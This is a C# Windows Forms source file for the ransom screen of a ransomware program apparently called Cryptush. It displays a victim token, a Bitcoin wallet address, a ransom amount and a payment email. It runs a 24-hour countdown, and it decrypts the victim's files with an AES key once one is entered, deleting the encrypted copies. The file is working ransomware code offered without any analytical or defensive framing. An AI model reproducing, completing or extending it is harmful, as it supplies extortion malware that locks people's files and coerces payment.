using System;
using System.IO;
using System.Windows.Forms;
using Cryptush.lib;

namespace Cryptush
{
    public partial class Form1 : Form
    {
        public int hcounter = 23;
        public int mcounter = 59;
        public int scounter = 60;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            tokenLabel.Text = Cryptush.code;
            walletText.Text = Cryptush.BitcoinWalletAddress;
            label2.Text = $"You have 24 hours to transfer {Cryptush.BtcAmount} BTC to wallet:";
            emailText.Text = $"Once paid, send your wallet address and the following token to {Cryptush.Email}:";
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            mcounter--;
            if (mcounter == 0)
            {
                if (hcounter == 0) { MinutesTimer.Stop(); }
                else { mcounter = 59; }
            }
            MinutesLBL.Text = mcounter.ToString();
        }

        private void htimer_Tick(object sender, EventArgs e)
        {
            hcounter--;
            if (hcounter == 0)
                HoursTimer.Stop();
            HoursLBL.Text = hcounter.ToString();
        }

        private void secondsTimer_Tick(object sender, EventArgs e)
        {
            scounter--;
            if (scounter == 0)
            {
                if (hcounter == 0) { secondsTimer.Stop(); }
                else { scounter = 59; }
            }
            secondsLBL.Text = scounter.ToString();
        }

        private void decryptButton_Click(object sender, EventArgs e)
        {          
            string key = KeyTextBox.Text;
            var files = dCollector.Start(Cryptush.paths);
            bool success = true;
            MessageBoxButtons button = MessageBoxButtons.OK;

            if (key != "")
            {
                if (files.Count != 0)
                {
                    foreach (string file in files)
                    {
                        string result = dAES.DecFile(file, key);
                        if (result != "OK")
                        {
                            MessageBox.Show(result, "Cryptush Error", button, MessageBoxIcon.Error);
                            success = false; 
                            break;
                        }
                        File.Delete(file);
                    }
                    if (success) { MessageBox.Show("Done.", "Cryptush", button, MessageBoxIcon.Information); }
                }
                else { MessageBox.Show("No Cryptush files were found", "Cryptush Error", button, MessageBoxIcon.Error);  }
            }            
        }
    }
}
